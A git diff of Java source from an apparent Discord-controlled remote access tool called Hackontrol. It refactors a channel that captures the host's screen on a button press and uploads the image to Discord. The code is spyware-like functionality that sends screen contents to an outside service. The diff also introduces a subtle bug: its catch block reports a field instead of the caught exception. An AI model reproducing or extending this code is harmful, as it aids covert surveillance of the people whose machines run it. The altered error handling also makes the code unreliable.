@@ -14,7 +14,8 @@ import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
 import com.khopan.hackontrol.registry.Registry;
-import com.khopan.hackontrol.utils.ErrorUtils;
+import com.khopan.hackontrol.utils.HackontrolButton;
+import com.khopan.hackontrol.utils.HackontrolError;
 
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
@@ -59,7 +60,7 @@ public class ScreenshotChannel extends HackontrolChannel {
 
 	private void screenshot(ButtonContext context) {
 		if(this.robot == null) {
-			ErrorUtils.sendErrorReply(context, this.Errors);
+			HackontrolError.throwable(context.reply(), this.Errors);
 			return;
 		}
 
@@ -70,15 +71,14 @@ public class ScreenshotChannel extends HackontrolChannel {
 		try {
 			ImageIO.write(image, "png", stream);
 		} catch(Throwable Errors) {
-			ErrorUtils.sendErrorReply(context, Errors);
+			HackontrolError.throwable(context.reply(), this.Errors);
 			return;
 		}
 
 		byte[] byteArray = stream.toByteArray();
 		context.replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(
 				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER),
-				ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")
-				).queue(ButtonManager :: dynamicButtonCallback);
+				HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
 	}
 
 	private static String getScreenshotFileName() {
